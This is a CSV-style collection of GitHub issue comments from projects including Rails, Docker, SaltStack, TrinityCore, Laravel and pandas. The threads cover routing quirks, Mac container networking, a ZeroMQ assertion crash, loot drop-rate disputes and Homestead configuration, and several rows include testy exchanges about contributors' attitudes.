rails/rails/5798/4041078,"Given a routes config with a namespace SomethingControllerapp/controllers/something_controller.rbuninitialized constant SomeNamespaceSomethingControllerapp/controllers/some_namespace/something_controller.rbve seen it happening multiple times now. This is pretty annoying, especially if you have a big test-suite that should prevent something like this from happening. It's hard to explain this to a customer that pays you a bunch of money because you pretend to test ""everything"" ... Please make sure that routing in development and especially in test environments yields the same results as in any other environment. ",,False,False,5798
rails/rails/5798/5043732,"What's your Rails version? If it's not the latest stable one, it'd be good to test with it. Routes shouldn't be different per environment, something looks very weird D. ",,False,False,5798
rails/rails/5798/5043788,"but i've seen this issue also in 3.0.x and 3.1.x. if i find the time i will try to reproduce this with 3.2.3 and add an example to reproduce it. it might also be some side-effect of devise or other dependencies... i thought it's worth adding as a bug, cause i've seen it happening multiple times and others might stumble over this too. ",,False,False,5798
rails/rails/5798/5043823,"Yeah it'd be good to have a way to reproduce it in a bare app. I'll try to take a look later as well, thanks. ",,False,False,5798
rails/rails/5798/5044669,i did a minimal app to reproduce the isse  the server and go to  should not give you an error. if you run it in production you get a 404 with an error in the logs ,,False,False,5798
rails/rails/5798/5050105,"First thing, leave the attitude at the door - nothing gets people more riled up than a sense of entitlement. If you check your  output you'll see that the controller should be namespaced, e.g The controller should be called . The reason that  works in development but not in production is due to a quirk with dynamic constant loading and ruby's constant lookup algorithm. The dynamic constant loading hooks into ruby’s constant lookup by supplying a custom  method, however before that is called ruby will search  for the constant. Since every class has  as an ancestor then it will return any matching top-level constants with the following warning Note that this isn't true for modules, e.g This leads me to suspect that the namespace you're using is a Active Record model - correct? This is why it's always better to post real-world code than pseudo-code - we don't have to guess what you're trying to achieve and often a crucial detail is left out in the translation. As for the testing - again I’m guessing but you're probably doing a functional test of the controller which won't pick up this error since that kind of test bypasses the request stack. If you do a integration test then it should fail as dynamic constant loading is turned off in the test environment The only way to ‘fix’ this issue is by removing the dynamic constant loading which would mean restarting the app every time you changed something in development, which given how everybody complains about boot time wouldn't be acceptable. If you don’t want to namespace the controller then just use a string , e.g ",,False,False,5798
rails/rails/5798/5053851,"@friend thx for elaborating on the issue. no, we are not using ActiveRecord at all. no, we are not doing functional tests but request spec. i added an example to the code. as what real-world code goes, i added an example app reproducing the error. i am not going to post any code that is under any private repo. i hope you can understand that there are actually people concerned with where their code goes. i am fine with rails not fixing this issue. i won't consider it a quirk, like you did. it's fine if it won't get fixed, but i think it's worth noting. i've seen people falling over it, i did it myself and i think that people will be glad if they find this issue here. ",,False,False,5798
rails/rails/5798/5062296,"@friend all I was suggesting was you post some of the controller boilerplate code, i.e. method names, class names, etc. - not actual implementations. As inflections are used quite heavily in routing often a inflection issue is masked when people post psuedo-code, hence my suggestion. Regarding your issue, the controller needs to be under the namespace. The fact that it works in development is a quirk of ruby itself which we can't fix - trust me I tried (I can dig out the old lighthouse tickets if you want). One thing puzzling me about you example app - why no test environment file? As soon as you add the standard test.rb file (minus the config for ActiveRecord and ActionMailer) then it fails. Without the test.rb file the environment defaults to development which is not what you want to be testing under. ",,False,False,5798
rails/rails/5798/5063736,"@friend i removed all the unnecessary code from the application and forgot to re-add the  file when i added the spec. i am still a little irritated, why this works at all. i would have thought that a missing environment file would cause the tests to fail, or prevent rails from booting in test env, because it explicitly sets the env ",,False,False,5798
moby/moby/22753/154939729,"Output of  Output of  Additional environment details (AWS, VirtualBox, physical, etc.) Steps to reproduce the issue 1. 2. 3. Describe the results you received No docker0 and absolutely no way to connect to services running on docker host via bridge gateway. I have tried it all and thought I was going crazy, then I tried exactly the same things on my ubuntu host with zero problems Describe the results you expected I would like to be able to connect to my local redis and other services without having to dockerize these... ",,False,False,22753
moby/moby/22753/299362839,"I just wanted to add a plus one/subscribe along with everyone else in this thread, and add another voice to the feature request of being able to easily access docker containers through the bridge interface on unique/custom IP addresses. I was ramming my head into the wall for at least 4 hours trying to figure out why I couldn't get any documented examples working, until I somehow found this issue, describing the problem perfectly. For now, the workaround mentioned by @friend ( seems to work passably well. I'm adding experimental Docker support to Drupal VM using the instructions  Add a host to  with  (e.g. ) Create an alias on the loopback interface  Bring up a container with the following pseudocompose version ""3"" services app  image image-name  ports    - 192.168.1.1008080    - 192.168.1.100443443  [...]    This seems to work perfectly for me, and though it currently requires a couple manual steps (which are avoided if using other tools on top of Docker... something I don't want to force my users to do), it allows me to almost reach Docker nirvana on Mac. So thanks for the workaround, and I hope you can find a way to get the bridge network working soon (or just abandon macOS &lt; 10.12 😏) ",,False,False,22753
moby/moby/22753/299364230,"@friend thank you sooo much, 192.168.65.1 has solved my issue. I hope this doesn't get changed in the future, unless they find a cleaner solution. As of Docker for Mac 17.0.3.1 this has allowed my container to talk to the MySQL server running on my machine's localhost. ",,False,False,22753
moby/moby/22753/299399253,@friend I'm glad it worked for you. Thanks for the feedback! ,,False,False,22753
moby/moby/22753/313679559,"Hi, I am reading the docs here  and I am trying to use the the special Mac-only DNS name mentioned there . If I do a ping on a terminal inside the docker container, it gets resolved to 192.168.65.1, and doing a curl to an app running on my mac retrieves the expected result. I am using this image  and I can open a Chrome browser there. So I wanted to go to  and the connection was refused. However, doing  works. Am I missing something? I wanted to start using the . ",,False,False,22753
moby/moby/22753/326294741,"I think that using  was a poor decision. The whole point of containers is that they are portable and should have no dependency on what type of host they reside. If my team is half Windows users and half Mac, then the code inside of our containers will have to be configured differently. I'm glad there's a hostname approach, I just think the meeting where this approach was decided should have lasted 5 more minutes. ",,False,False,22753
moby/moby/22753/330376075,worked. Hilarious. ,,False,False,22753
moby/moby/22753/340436460,"I worked around this problem by reverting back to docker-machine for Mac. The docker machine VM  is a Linux distro which means that it creates a docker0 interface which has access to the private network range of the docker containers. Then, on my host mac machine, I created a route for the 172.18.x.x address range of the containers which points to the ip address of the docker machine instance (192.168.99.100 in my case). This allows packets destined for the private container network to be forwarded by my mac OS to the IP address of the linux VM of docker machine, which knows how to reach the private containers and forwards the packets to them directly. Creating the route to the docker machine vm for the private container network You can get the address for the container network by using  or . ",,False,False,22753
moby/moby/22753/400663231,You can find ip of the host in docker for mac this way ,,False,False,22753
moby/moby/22753/449775560,I had the same problem whilst using osx on home wifi. In the office it worked fine on wifi yet i guess they have a typical office setup with ip addresses created on the fly. I ran the command  then i  looked at the ports section mine says 0.0.0.080 i didnt think it would work yet it did i tried that ip address in the browser and it works fine. I have also updated /etc/hosts on the mac to 0.0.0.0 for each domain and it works perfect. sometimes the simple and obvious is the best answer. ) ,,False,False,22753
moby/moby/22753/449776679,Run this command  docker ps` if it says 0.0.0.0 then that  will  work fine once the port is exposed  or any other ip address written  there. ,,False,False,22753
rust/rust-lang/7803/16774829,"I'm surprised that I was unable to find an open issue for this. Read  for the basic idea. From what I understand the general attitude is favorable, but people have yet to decide whether to salvage the  sigil or to require  to now be written . Let's try to defer these syntax decisions and just get GC-in-a-library working as soon as possible, if people agree that it is desirable. Nominating for 0.8. Aggressive, but I feel like we're going to suffer if we try to put this off for too long. ",,False,False,7803
TrinityCore/TrinityCore/10510/17901778,"The quest itself might work, but it is still not finished. 1 text fails to execute, even when forced by an in-game data set command.  The end data set text also doesn't execute, nor do the actions.  Mirror aura is lost on Future You's evade mode; the core is only set to allow a vehicle aura on evade, anything else will be wiped out, including the clone aura. I don't have much time to finish those things, so you can test it out if you want, and add suggestions. ",,False,False,10510
TrinityCore/TrinityCore/10510/22444187,"Creature entry 27898 has EventAI scripts, but its AIName is not 'EventAI' - possible AI-mismatch? Creature entry 27900 has EventAI scripts, but its AIName is not 'EventAI' - possible AI-mismatch? ",,False,False,10510
TrinityCore/TrinityCore/10510/22444244,"Nothing in my DB's, but if there really are any EAI's ",,False,False,10510
TrinityCore/TrinityCore/10510/22444257,"Yup, there are! ",,False,False,10510
TrinityCore/TrinityCore/10510/22444832,"Also first creature_text should be ""'Hey there,"" ",,False,False,10510
TrinityCore/TrinityCore/10510/22444892,"No, it's ""Hei there..."" that's sniff info. And it's also ""Future you"" an npc that is your clone from the future, which in terms explains why the text is ""Hei"", it's something usually a player would say.  Would be best to change it though, ""Hei"" does sound rather strange. ",,False,False,10510
TrinityCore/TrinityCore/10510/22445113,"""Future You whispers Hey there, &lt;name&gt;, don't be alarmed. It's me... you... from the future. I'm here to help."" ",,False,False,10510
TrinityCore/TrinityCore/10510/22445129,"Now go for the redux part - Mystery of the Infinite, Redux plus one ",,False,False,10510
TrinityCore/TrinityCore/10510/22445136,Oh and look here  at 720p ,,False,False,10510
TrinityCore/TrinityCore/10510/22445165,"I already changed it to ""Hey"", but I still have no idea why the sniff would show a ""Hei"", unless it was tampered by mistake. I'm not going to do redux until this one is finished. ",,False,False,10510
TrinityCore/TrinityCore/10510/22454418,"Great work Kirk!... as always. I would like to state that the quest is fully completable now, but there are a few cosmetic bugs with it. Just a few notes, I apologize if you already know this.  First creature_text   Does not appear to me.  Future You's character model disappears after he whispers you. ""I can't believe I used to wear that"". You can still target him by typing /tar future, but his character model is gone. Although mobs still will attack him while he's invisible!  He does not talk to you after saying ""I can't believe I used to wear that."" I don't appreciate his sassy attitude very much. xD  Weapons do not appear on Future You. He fist punches everything.  Future You has a 'PvP' flag, I could be wrong, but I don't think he's supposed to be flagged for PvP.  Nozdormu does not appear after the quest is finished.   Keep up the good work! ",,False,False,10510
TrinityCore/TrinityCore/10510/22455145,"The quest itself might work, but it is still not finished. 1 text fails to execute, even when forced by an in-game data set command. &lt;&lt;&lt;&lt; ",,False,False,10510
TrinityCore/TrinityCore/10510/22457802,"Ok forget, this was nothing to do... ",,False,False,10510
TrinityCore/TrinityCore/10510/22458521,"Updated the above post with new changes, every aforementioned issue should now be fixed; This including, the text that didn't show, the fail quest if the hourglass is destroyed, the despawn set when the quest is finished. The only real issue that remains (And this is core sided) is that all auras save for one excluded are wiped form the npc on evade, we must find a circumvention for this aura or simply add it as an exclusion in the core also. Currenty @friend is working on this, and will keep you posted. Test out the updated script, and tell me if there are issues. And also note, if the Future You npc ends combat it will evade and lose it's clone aura, this will automatically make the script not work for him anymore, and he won't execute any text lines, or any lines for that matter; keep him in combat to test the script at all times. ",,False,False,10510
TrinityCore/TrinityCore/10510/22460343,"Quest does not complete now, even when Future You stays in combat the entire event. Future You's weapons are still not shown. Nozdormu still does not appear, but that probably won't be fixed until and update is released to keep Future You from disappearing out of combat. As the last two lines of creature_text are not displayed. Otherwise that, all creature_text is now working as long as Future You stays in combat. ",,False,False,10510
TrinityCore/TrinityCore/10510/22460414,Did you try cleaning client cache? ,,False,False,10510
TrinityCore/TrinityCore/10510/22460649,"Uhm, the quest should complete just fine; Also, Nozdormu only appears if the quest status is completed, because that aura is in spell_area. The last two lines should also appear, no idea why they don't for you. Did you try copying the new script up there? It is updated. ",,False,False,10510
TrinityCore/TrinityCore/10510/22460703,"Gah, such a stupid mistake. Thank you Chazy, I will be going to bed now. Quest now completes as long as Future You stays in combat. Nozdormu does appear at the end now along with the two creature_text lines. Weapons are still not displayed on Future You. ",,False,False,10510
TrinityCore/TrinityCore/10510/22460795,"That's a minor cosmetic bug, I can't deal with it now; what I really want done is to prevent the clone aura being removed. I'm glad everything else is fine now. Also, for me, a weapon and a shield appear on Future You, but not the ones I own, rather totally different ones. ",,False,False,10510
TrinityCore/TrinityCore/10510/22494493,"Okay, aura issue fixed in faa2ec9 Please compile with that commit and re-try the quest now. Only thing left to fix now is getting the clone to not bounce off data sets. If he doesn't receive them, he won't execute script. ",,False,False,10510
TrinityCore/TrinityCore/10510/33981901,@friend  Sorry but i have a question to your commit. You set smart_ai for 27896 (NPC_AI) and 27897(NPC_ID) but you dont insert a smart_script for this id's. ,,False,False,10510
pandas/pandas-dev/7750/37810421,"6848 is no where mentioned in the release notes. There's a single item on changing to quicksort, but it doesn't explicitly warn that the sort was previously stable and now isn't. There's also no warning about  changing as well. That API has been around forever and afaict nothing was gained by breaking it. This was a fairly reckless change in my opinion, I do wish the current maintainers cared more about backwards-compatibility then they seem to in the latest releases. ",,False,False,7750
salt/saltstack/3618/10700102,"When I try to make use of the reactor, I end up with an Assertion failed message. After that message, no minions can authenticate to the master and trying to stop the master process through the init script fails. I do see the master process running and need to use killall to stop it. If I then remove the reactor piece of the master config and start the master process, everything starts working again. root@friend~# /etc/init.d/salt-master start Starting salt-master daemon Assertion failed ok (mailbox.cpp84) . root@friend~# /etc/init.d/salt-master stop Stopping salt master control daemon ...start-stop-daemon warning failed to kill 10113 No such process . root@friend~# killall salt-master root@friend~# cat /etc/salt/master timeout 30 log_level warning state_verbose False  file_roots   base     - /srv/salt     - /srv/data  pillar_roots   base     - /srv/pillar  ext_pillar   - boothost_templates {}  reactor   - 'auth'     - /srv/reactor/empty.sls  root@friend~# cat /srv/reactor/empty.sls  return_true   cmd.run     - name echo 'hi'  ",,False,False,3618
salt/saltstack/3618/13192548,I take it you are using git head? Do you have zombies when this happens? ,,False,False,3618
salt/saltstack/3618/13192906,"Yes, I'm using head. I don't know how to tell if I have zombies or not... I'm going to guess that I do because that would explain the attitude the processes give me. When it's pissed, ps aux shows me this. It's set to have the default number of processes. root     10364  1.3  2.0 136600 21412 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d root     10371  0.0  1.5 170972 16076 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10374  0.0  1.5 170300 15564 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10379  0.0  1.5 186692 15808 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d When it's working fine... root     10418  0.0  1.6 235960 16444 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10419  0.0  2.0 136600 21408 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d root     10426  0.0  1.5 170960 16068 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10427  0.0  1.5 170824 15852 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10428  0.1  2.2 222300 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10435  0.1  2.2 287840 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10436  0.1  2.2 287840 22764 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10437  0.1  2.2 287840 22772 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10438  0.1  2.2 287848 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d ",,False,False,3618
salt/saltstack/3618/13193033,"ok, this is not zombies, those are all S and Sl flags for healthy processes, it looks like the procs are failing to start! ",,False,False,3618
salt/saltstack/3618/13193323,"They don't love me... ( Is there something I probably did wrong or is this a bug? If it's a bug, please let me know what I can do to help fix it. ",,False,False,3618
salt/saltstack/3618/13193614,"meh, I can't reproduce this. How old is your git head? ",,False,False,3618
salt/saltstack/3618/13193766,It's from yesterday. I'll try it on the latest now. ,,False,False,3618
salt/saltstack/3618/13193866,.. same thing ,,False,False,3618
salt/saltstack/3618/13194038,What version of Zeromq are you running? ,,False,False,3618
salt/saltstack/3618/13194118,This is Debian right? ,,False,False,3618
salt/saltstack/3618/13194173,Yup. root@friend~# apt-cache policy python-zmq python-zmq   Installed 2.2.0-1   Candidate 2.2.0-1   Version table  *** 2.2.0-1 0         800  wheezy/main amd64 Packages         700  unstable/main amd64 Packages         100 /var/lib/dpkg/status  ,,False,False,3618
salt/saltstack/3618/13194821,What version of libzmq are you running? is it libzmq 2.2.0 or 3.2? I think this might be us running into a know libzmq 2 bug (which would explain me having issues reproducing this) ,,False,False,3618
salt/saltstack/3618/13194880,The package name is libzmq1 ,,False,False,3618
salt/saltstack/3618/13195580,"So this Assertion happens because of a bug in libzmq 2, and if a zmq context it passed through to a new thread or process, I have verified that the later is not happening in the code anywhere. So I am wondering what apt-cache policy libzmq1 says, and if updating to libzmq3 will fix it ",,False,False,3618
salt/saltstack/3618/13197460,"#  apt-cache policy libzmq1 libzmq1   Installed 2.2.0+dfsg-2   Candidate 2.2.0+dfsg-2   Version table  *** 2.2.0+dfsg-2 0         800  wheezy/main amd64 Packages         700  unstable/main amd64 Packages         100 /var/lib/dpkg/status  I also installed libzmq3 from experimental. I ran into the same problem. The salt-master depends on python-zmq which depends on libzmq1. So I have both libzmq1 and libzmq3 installed right now. I'm not sure how to make sure I'm using libzmq3(3.2) instead of libzmq1(2.2). I could install salt from source on the system, but I very much prefer build the package on our apt mirror and install it from there... #  apt-cache policy libzmq3 libzmq3   Installed 3.2.2+dfsg-1   Candidate 3.2.2+dfsg-1   Version table  *** 3.2.2+dfsg-1 0           1  experimental/main amd64 Packages         100 /var/lib/dpkg/status  ",,False,False,3618
salt/saltstack/3618/13198127,"If I change the dependency in the package to libzmq3 instead of python-zmq and install libzmq3 without either python-zmq or libzmq1 (its dependency) then I get ""ImportError No module named zmq"". I guess I don't really have any idea how to get zmq3 without zmq1. ( ",,False,False,3618
salt/saltstack/3618/13198447,"Sorry, I should have been more specific, libzmq3 is just the latest zeromq, it is much better and we leverage it for a lot of new features. you still need pyzmq installed, since that is the python bindings to libzmq, although you may need to recompile pyzmq after libzmq3 is installed ",,False,False,3618
salt/saltstack/3618/13198473,"I think there are packages out there, lemme look ",,False,False,3618
salt/saltstack/3618/13198658," doesn't even have 3.2. I installed libzmq3 and then rebuilt pyzmq with ""easy_install -U pyzmq"" and now when I start the salt master, I get this - Starting salt-master daemon Assertion failed ok (bundled/zeromq/src/mailbox.cpp84) I'll wait until I give you a chance to do smart people research. ) ",,False,False,3618
salt/saltstack/3618/13198966,"yes, pyzmq 2.2.0 works against zeromq 3.2, it is kind of confusing, but we are still getting the assertion!!! Lemme keep trying to find out what is happening ",,False,False,3618
salt/saltstack/3618/13199186,"man, if I could get on your system and start throwing in debug output this would be a lot easier to find.... I am still looking ) ",,False,False,3618
salt/saltstack/3618/13199928,"I am stumped, I can't reproduce it, I can't find any legitimate place in the code that would cause this, libzmq3 does not seem to fix it. I am still thinking and researching, but I am drying up on ideas.... ",,False,False,3618
salt/saltstack/3618/13202409,If you were to chat with me on IRC I could do everything you ask as you ask me to do it. I unfortunately wouldn't be able to let you into the system. ,,False,False,3618
salt/saltstack/3618/13203201,"Interesting... If I leave out the reactor part, I wind up with ""salt-master -l trace"" doing exactly what I expect. If I add the reactor part of the config and run ""salt-master -l trace"" and what I see is this,  not pressing Ctrl+C to kill it. It seems to just stop running but salt-master processes continue to run in the background. ",,False,False,3618
salt/saltstack/3618/13203326,"This is the part that I find interesting from that... [TRACE   ] Added extra.config to grain [DEBUG   ] SaltEvent PULL socket URI ipc///var/run/salt/master/master_event_pull.ipc [INFO    ] Setting up the master communication server [TRACE   ] Added extra.shell to grain Assertion failed ok (mailbox.cpp84) Aborted root@friend~# [DEBUG   ] loading module in ['/var/cache/salt/master/extmods/modules', '/usr/lib/pymodules/python2.7/salt/modules'] [DEBUG   ] Skipping /var/cache/salt/master/extmods/modules, it is not a directory [DEBUG   ] Loaded groupadd as virtual group [TRACE   ] Added group.add to module  It shows the prompt but keeps truckin' along. [DEBUG   ] Loaded sysmod as virtual sys [TRACE   ] Added sys.doc to runner  root@friend~# ps aux | grep salt root     16563  0.0  2.1 136884 21620 pts/1    S    1419   000 python /usr/bin/salt-master -l trace root     16570  0.0  1.5 175036 16140 pts/1    Sl   1419   000 python /usr/bin/salt-master -l trace root     16571  0.0  1.5 174500 15660 pts/1    Sl   1419   000 python /usr/bin/salt-master -l trace root     16578  0.0  1.5 191024 15896 pts/1    S    1419   000 python /usr/bin/salt-master -l trace  ",,False,False,3618
salt/saltstack/3618/13203805,"So far, I've managed to get to line 130 ""self._popen = Popen(self)"" of process.py before I see the error. I have no idea what I'm doing here, I'm just able to see it getting that far and that being the line where things go boom. ",,False,False,3618
salt/saltstack/3618/13204484,"This does make it look like a zmq context is being passed into a new process, I am going to hop into IRC ",,False,False,3618
framework/laravel/2513/21197899,"Can we get some form helper for Laravel for the likes of &lt;input id=""movie"" type=""number"" value=""0""/&gt;  More info on the number input at ",,False,False,2513
framework/laravel/2513/26568963,Is this too hard? ,,False,False,2513
framework/laravel/2513/26569084,"Don't need the attitude. If you look at the form helpers, there's a pattern [[ Formtype ]] Formtextarea Formtext Formselect So I suggest Formnumber ",,False,False,2513
framework/laravel/2513/26569374,It should be merit to ask if the existing structure if too hard to implement or too limiting which need to result for an alias to be added. Anyway it been asked/request before and the response was ,,False,False,2513
framework/laravel/2513/26569946,"Alrighty then. This would hardly be an alias though of something already there, it would just be a new helper. ",,False,False,2513
framework/laravel/2513/34226078,"Formnumber only if you to create the method inside of FormBuilder. You should call {{ Forminput('number', 'name of input') }} ",,False,False,2513
framework/laravel/2513/40646019,"You can use this file to create alias for the remaining 11 HTML5 elements (email &amp; URL are enabled out of the box)  enables Inputdate('input_name', 'input_value', $options_array), etc ",,False,False,2513
bootstrap/twbs/16338/70364857,"I'm not familiar with this repository, and I can't ascertain the bootstrap attitude toward userAgent styles. Regardless, Chrome OSX 42.0.2311.90 changes the  style of html5 time elements. Is this something bootstrap should rein in or is it a  fix? ",,False,False,16338
bootstrap/twbs/16338/96114171,Probably don't need to do much here since we override much of those styles with  anyway. Thanks for the heads up though! ,,False,False,16338
bootstrap/twbs/16338/96121648,Interesting note Their  can't be totally overridden; their calculated  is always some kind of flex. Setting  just makes it compute to  (instead of ). ,,False,False,16338
TrinityCore/TrinityCore/6137/4033130,,,False,False,6137
TrinityCore/TrinityCore/6137/5131126,this is already in the database thus does not require adding ,,False,False,6137
TrinityCore/TrinityCore/6137/5138949,I'm currently not using the latest DB so I can't be certain they ware fixed but I don't remember seeing the fix and the values are different in my version. ,,False,False,6137
TrinityCore/TrinityCore/6137/5711805,@friend what part of the code below would you say is already in the DB? Do compare the values from my fix above with the values from the current DB below before you answer. Please reopen the issue since it is obvious the drop chance values are wrong in TDB 11.46 updated to e74135946d2cb2b6a522cfa979cfef0263a9fd8e and this can be confirmed by the link I provided in the first post. ,,False,False,6137
TrinityCore/TrinityCore/6137/5734582,"The drop chances that are in DB atm are very similar... 0.6 vs 0.5, 0.5 vs 0.4 ",,False,False,6137
TrinityCore/TrinityCore/6137/5759080,Yet they are wrong enough to need fixing &lt;IMG&gt;,,False,False,6137
TrinityCore/TrinityCore/6137/5760243,"If you, in-game, can tell that an item drops 0.2% more using a different DB... I don't even know what to say. Minimum is 0, maximum is 100 and we are arguing over decimals... Thanks for the fix but I think our time would be better wasted with something more serious. ",,False,False,6137
TrinityCore/TrinityCore/6137/5761487,"I give up, when I was told by others they won't post there fixes here because of the dev's attitude I did not understood them. Now I think I finally do understand ... You just told me that you don't care that the ""Elegant Dress"" (  ) doesn't have the same chance to drop as Spring Rabbit's Foot, Spring Circlet, Spring Flowers and Spring Robes (they should have the same chance) just because you don't think it'll have any difference for the players if the value is 0,3% less than is should be... You also told me that you don't care if the values in TDB are not correct and won't apply a fix because you consider it a waste of time. ",,False,False,6137
TrinityCore/TrinityCore/6137/5761539,"That means you can't accept a no? Look at the god damn values again and tell if it is worth it, and why. ",,False,False,6137
TrinityCore/TrinityCore/6137/5763138,"You are constantly rejecting fixes because they are not blizzlike, yet now you are rejecting a blizzlike fix because you think that the difference in the values is not big enough ... But the result is that players are wasting hours farming the ""Elegant Dress"" item during the 1 week Noblegarden event in hopes of getting the ""Dressed for the Occasion"" achievement year after year and can't get it while getting multiple copy's of the other 4 items that are supposed to have the exact same chance to drop ... Do note that while minuscule in terms of 0-100% the difference in drop chance is 250% ",,False,False,6137
TrinityCore/TrinityCore/6137/5764273,"Constantly rejecting fixes? Do you have anything to back that statement? And what makes you think that your values are more correct than the current ones? I don't know if our values are correct either but since they are already in the DB and your changes introduce no significant changes, I (we) are not pushing it. Wowhead is based on empirical data, it is not a reliable source of data. There's no good way to get the exactly correct values (except for those loot table where you have, e.g, 10 items in a group and you know that one of those items has to drop) And about the 250%, I think your math is a little bit off. I would not like to continue this useless and stupid discussion. ",,False,False,6137
TrinityCore/TrinityCore/6137/5765015,nelgalno if you wish to change %'s then post udate queries. above fix is not needed thus rejected. ,,False,False,6137
TrinityCore/TrinityCore/6137/5766603,"&lt;b&gt;Do you have anything to back that statement?&lt;/b&gt;  what makes you think that your values are more correct than the current ones?&lt;/b&gt; I did some research before posting here as evidenced by the links above. &lt;b&gt;And about the 250%, I think your math is a little bit off.&lt;/b&gt; 0.2 + 0.3 = 0.5% == 100% + 150% = 250% &lt;b&gt;post udate queries&lt;/b&gt; ",,False,False,6137
TrinityCore/TrinityCore/6137/5770914,"yes the loot% on your thottbott, wowhead and other links are all momentairy, i challenge you to check it again in 2 weeks or even in 5, and see that the %chances have changed yet again. therefor you should NOT use hardcoded ChanceOrQuestChance but group them accordingly and set a rough chance for them as a whole. 0.2+0.3 = 0.5 (that is correct) but the increase in % = 0.3/0.2 = 150% not 250% ",,False,False,6137
TrinityCore/TrinityCore/6137/5770922,"fix is rejected, my final statement, and im the loot dev ",,False,False,6137
TrinityCore/TrinityCore/6137/5774664,"They held those values since the time of the Noblegarden event == more than a month ago ... If we assume that the current TDB value is 100% + the 150% increase I suggest equals 250% ... P.S. I don't care, it is your choice to accept or reject the fix. I know that I did my best to provide the information/evidence that the values in TDB are incorrect and you choose to ignore it ... ",,False,False,6137
framework/laravel/6531/50444331,"With the rewrite of Homestead v2, it is now considerably more difficult (if not impossible) to share development environment code on a project. One of the key benefits of Vagrant is committing the  to a repository and thereby having all developers working from the same environment. (Isn't that the whole point of Vagrant?) But with Homestead 2, all your config lives in your own personal  directory, and is non-shareable. I was never really a fan of the instructions for Homestead 1 which advocated using a single, central clone of the homestead repository. (Am I really the only one who uses separate homestead boxes per project? Do other people prefer not to segregate environments? That's like developing on our own little shared hosting boxes, allowing different project code and installation requirements to co-mingle.) But at least with the original Homestead it was possible to put the homestead files inside your project's repo (I used , since I'd customize the provision scripts.) With Homestead 2 and , the ability to customize the environment is getting better (and somewhat more reproducible), but taking a huge step backwards in shareability. While bundling homestead commands as a composer project is great, further centralizing config seems to be taking Homestead in a wrong direction... ",,False,False,6531
framework/laravel/6531/65021377,"After further thought, I've come to believe Homestead is designed around having developer-centric environments, as opposed to project-centric environments. Which seems entirely backwards to me. Sure, it works if you're developing a very basic application* and the stock Homestead install works out of the box for your project, or if you're working alone. But I've worked on very few projects that have the same server-side software requirements or are limited to a single developer. Need to add elasticsearch? Switch to MariaDB? What about build tools other than grunt or gulp? Want to use the awesome maildev during development? Homestead allows you to customize your development environment, and do so in a way that isn't affected by your host system. But it doesn't allow you to share those customizations. Which is a huge step backwards from the massive improvements (and productivity gains) Vagrant has brought to the development process. * I assume some will argue that the default Homestead box is designed to work with Forge, which is very probably true. But will Forge really never get the ability to add provision steps and add customize server environments during deployment? Maybe not, but if not, it will remain relatively niche. I love Homestead and Forge because they provide clean, solid base environments on which I can develop. But if I have to give all that up and start from scratch as soon as I need to customize my environment, that doesn't make me code very happy. I hope we can figure out a better way to manage development and deployment environments using the full power of the tools we have... ",,False,False,6531
framework/laravel/6531/65022014,Couldn't you still use a subtree for the latest version though? The repository is still there laravel/homestead I'm sure you're not required to install the global Composer package and use the  command. ,,False,False,6531
framework/laravel/6531/65023134,"Not really. The Vagrantfile already assumes a  directory. And I can only guess it's going to go more down this path. On top of that, the subtree solution isn't a great one to begin with. It's hard to maintain as soon as you need to make changes to the Vagrantfile or homestead.rb, in which case you're basically giving up on future upstream changes. Which, from what I can tell, is one of the reasons for the changes in Homestead 2. But I just think it's limiting Laravel development more than expanding. What I'd be hoping for is more of a modular system, where concepts like  are a bit more flexible and can be loaded from a project (or also a home directory if desired). Something like the way  and other configuration systems work, maybe using Vagrantfile inheritance. It adds complexity, but there's no reason it needs to be exposed to most developers. If working out of a single shared box is fine for your needs, great. I just wish Laravel offered support for better practices from the start. ",,False,False,6531
framework/laravel/6531/65023305,Ah you're right. I didn't even take a look in there. I agree that more flexibility for more advanced developers should be as big a priority as making it easy for newer developers to quickly get up and running. But I'm hardly one to comment on how it would be achieved as I'm not exactly a pro at Vagrant or provisioning servers. grinning ,,False,False,6531
framework/laravel/6531/65371411,I was about to propose a way to fix this in your  file you could have a  (name negotiable) array that has file paths to the root of a laravel install and it can read the a  for the site specific stuff like provision scripts and database names and site public directory and local url just an idea I will be ready to submit a pull request later about this ,,False,False,6531
framework/laravel/6531/65380358,"Agreed, I prefer to have separate boxes per project and am currently rolling my own solution as well.  Homestead 2 indeed makes this more difficult.  I want my project to configure the box. ",,False,False,6531
framework/laravel/6531/65528369,"@friend That would be an improvement over the status quo, but not really go far enough to be too useful. How many settings can you really put into ? I mean, all of them benefit from being project-specific, but are less important settings that be maintained by all developers across a project (though I advocate they absolutely still be shared settings). At a minimum,  and  also need to be able to be project-specific, but this would be much cleaner if these two extra script files [had been implemented as part of Homestead.yamlHomestead.rbVagrantfile~/.homestead/Homestead.yamlhomestead upHomestead.yamlafter.shaliases` if they exist. That would be much closer to a more flexible system that could still work the way it currently does if users want that (though personally I'm not a fan of recommending developers use a shared host model at all). ",,False,False,6531
framework/laravel/6531/65725076,"@friend @friend most people using homestead don't need all of the customisability of vagrant, they just go  and everything works for them I think homestead is targeted to people who may be a bit scared of the command line and prefer to work with things that they can see if you want to run a application per vm then I think you should be using just normal vagrant this is where is was trying to go with my changes now to configure homestead you will just edit the  in the project directory and not have to find it in a hidden folder or run a console command and I was going to add a way for homestead to add that project file path by its self  maybe with  and then it will add the current working directory to the  array and look for a  in that directory for the settings used by that project ",,False,False,6531
framework/laravel/6531/65727548,maybe even if homestead included the laravel installer so that running  it could install a new version of laravel and then add it to homestead automatically ,,False,False,6531
